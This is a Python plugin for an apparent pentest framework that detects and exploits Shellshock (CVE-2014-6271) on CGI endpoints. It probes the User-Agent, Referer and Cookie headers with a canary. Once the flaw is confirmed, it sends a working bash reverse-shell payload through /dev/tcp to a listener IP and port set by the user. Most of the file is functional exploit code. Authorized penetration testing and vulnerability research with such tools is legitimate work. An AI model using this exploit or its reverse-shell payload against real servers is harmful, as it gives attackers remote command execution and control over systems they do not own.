#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Shellshock (CVE-2014-6271) -- detect and optionally exploit a vulnerable CGI."""

from __future__ import annotations

from core.methods import inject, modkit as kit
from core.methods.print import psploit

info = ("Tests whether a CGI endpoint is vulnerable to Shellshock (CVE-2014-6271) by "
        "injecting an `echo` of a random canary through several request headers and "
        "confirming it appears in the response. If SHELL-IP and SHELL-PORT are set, a "
        "reverse-shell payload is sent on confirmation -- run a listener first.")
searchinfo = "Shellshock Exploit"
properties = {
    "PATH": ["CGI path to test, e.g. /cgi-bin/status (empty: the target URL)", ""],
    "SHELL-IP": ["IP your reverse-shell listener is on (empty: detect only)", ""],
    "SHELL-PORT": ["Port your reverse-shell listener is on (empty: detect only)", ""],
}

# Headers reflected into CGI environment variables; each is a Shellshock vector.
VECTORS = ("User-Agent", "Referer", "Cookie")


def _target_url(web) -> str:
    path = kit.option(properties, "PATH", "CGI path to test", "")
    if not path:
        return kit.url(web)
    if path.startswith(("http://", "https://")):
        return path
    return kit.url(web) + "/" + path.lstrip("/")


def _probe(session, url: str, header: str):
    """Send the canary payload through `header`; return the canary if reflected."""
    canary = inject.marker()
    payload = "() { :;}; echo; echo; echo %s" % canary
    try:
        resp = session.get(url, headers={header: payload})
    except Exception:
        return None
    body = inject.text(resp)
    return canary if canary in body else None


def shellshock(web):
    psploit("shellshock")
    url = _target_url(web)
    session = kit.http(timeout=15)
    kit.info(f"Testing {url} for Shellshock via {', '.join(VECTORS)} ...")

    hit = None
    for header in VECTORS:
        canary = _probe(session, url, header)
        if canary:
            hit = header
            break
    if not hit:
        kit.bad("Target does not appear vulnerable to Shellshock.")
        return False

    # Confirm with a second, independent canary before calling it a finding.
    if not _probe(session, url, hit):
        kit.warn(f"Canary reflected once via {hit} but not on re-test; treat as unconfirmed.")
        return False
    kit.found("Shellshock confirmed", f"{url} via the {hit} header")

    ip = kit.option(properties, "SHELL-IP", "Reverse-shell IP", "")
    port = kit.option(properties, "SHELL-PORT", "Reverse-shell port", "")
    if not (ip and port):
        kit.info("Set SHELL-IP and SHELL-PORT to deliver a reverse shell.")
        return True

    payload = '() { :; }; /bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"' % (ip, port)
    kit.warn(f"Sending reverse-shell payload to {ip}:{port} (have a listener ready)...")
    try:
        session.get(url, headers={hit: payload})
        kit.info("Payload sent; check your listener.")
    except Exception as e:
        kit.bad(f"Exploit request failed: {type(e).__name__}: {e}")
    return True


def attack(web):
    shellshock(web)
